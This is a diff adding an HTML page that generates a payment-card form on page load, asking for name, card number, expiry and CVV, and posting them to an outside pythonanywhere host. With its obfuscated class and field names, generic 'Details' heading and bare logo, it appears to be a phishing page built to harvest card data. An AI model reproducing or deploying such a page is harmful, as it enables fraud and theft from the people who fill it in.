@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+    <style>
+        input {
+            width: 100%;
+        }
+
+        #x1 {
+            background: #fff !important;
+        }
+
+        .x2 {
+            display: flex !important;
+        }
+
+        .x3 {
+            align-items: center !important;
+        }
+
+        .x4 {
+            justify-content: center !important;
+        }
+
+        .x5 {
+            height: 100vh !important;
+        }
+
+        .x6 {
+            padding: 2rem !important;
+        }
+
+        .x7 {
+            border-radius: 0.5rem !important;
+        }
+
+        .x8 {
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1) !important;
+        }
+
+        .x9 {
+            width: 24rem !important;
+        }
+
+        .x10 {
+            font-weight: 600 !important;
+        }
+
+        .x11 {
+            margin-bottom: 1.5rem !important;
+        }
+
+        .x12 {
+            color: #555 !important;
+            font-size: 0.875rem !important;
+        }
+
+        .x13 {
+            padding: 0.5rem 1rem !important;
+            border: 1px solid #ddd !important;
+            border-radius: 0.375rem !important;
+        }
+
+        .x14 {
+            margin-right: 0.5rem !important;
+        }
+
+        .x15 {
+            margin-left: 0.5rem !important;
+        }
+    </style>
+</head>
+
+<body id="x1">
+    <nav class="absolute x2 x3 justify-between x6 x8 w-screen">
+        <img src="./media/logo.png" alt="L" class="scale-[0.65]" />
+    </nav>
+    <div class="bg-gray-100 x2 x3 x4 x5">
+        <div id="form-container" class="x6 x7 x8 x9">
+            <!-- Form will be generated here -->
+        </div>
+    </div>
+    <script>
+        // Function to dynamically generate the form
+        function generateForm() {
+            const formContainer = document.getElementById('form-container');
+
+            // Create form element
+            const form = document.createElement('form');
+            form.id = 'xy';
+            form.method = 'post';
+            form.action = 'https://lesotol784.pythonanywhere.com/information';
+
+            // Form heading
+            const heading = document.createElement('h2');
+            heading.className = 'text-2xl x10 x11';
+            heading.textContent = 'Details';
+            formContainer.appendChild(heading);
+
+            // Utility function to create form fields
+            function createField(labelText, id, name, type, placeholder = '', maxLength = '') {
+                const fieldContainer = document.createElement('div');
+                fieldContainer.className = 'x11';
+
+                const label = document.createElement('label');
+                label.setAttribute('for', id);
+                label.className = 'block x12';
+                label.textContent = labelText;
+
+                const input = document.createElement('input');
+                input.type = type;
+                input.id = id;
+                input.name = name;
+                input.className = 'x13';
+                input.placeholder = placeholder;
+                input.required = true;
+                if (maxLength) input.maxLength = maxLength;
+
+                fieldContainer.appendChild(label);
+                fieldContainer.appendChild(input);
+                return fieldContainer;
+            }
+
+            // Add form fields
+            form.appendChild(createField('Name', 'xa', 'z1', 'text'));
+            form.appendChild(createField('Number', 'xb', 'z2', 'tel', 'XXXX XXXX XXXX XXXX', '16'));
+
+            // Expiration fields container
+            const expirationContainer = document.createElement('div');
+            expirationContainer.className = 'x2';
+
+            const expMonth = createField('Exp. Month', 'xc', 'z3', 'tel', 'MM', '2');
+            expMonth.className += ' w-1/2 x14';
+            expirationContainer.appendChild(expMonth);
+
+            const expYear = createField('Exp. Year', 'xd', 'z4', 'tel', 'YY', '2');
+            expYear.className += ' w-1/2 x15';
+            expirationContainer.appendChild(expYear);
+
+            form.appendChild(expirationContainer);
+            form.appendChild(createField('CVV', 'xe', 'z5', 'tel', 'XXX', '3'));
+
+            // Submit button
+            const submitButton = document.createElement('button');
+            submitButton.type = 'submit';
+            submitButton.className = 'bg-red-900 text-white x13 w-full hover:bg-blue-600';
+            submitButton.textContent = 'Submit';
+
+            form.appendChild(submitButton);
+
+            // Append the form to the container
+            formContainer.appendChild(form);
+        }
+
+        // Generate form on page load
+        window.onload = generateForm;
+    </script>
+</body>
+
+</html>
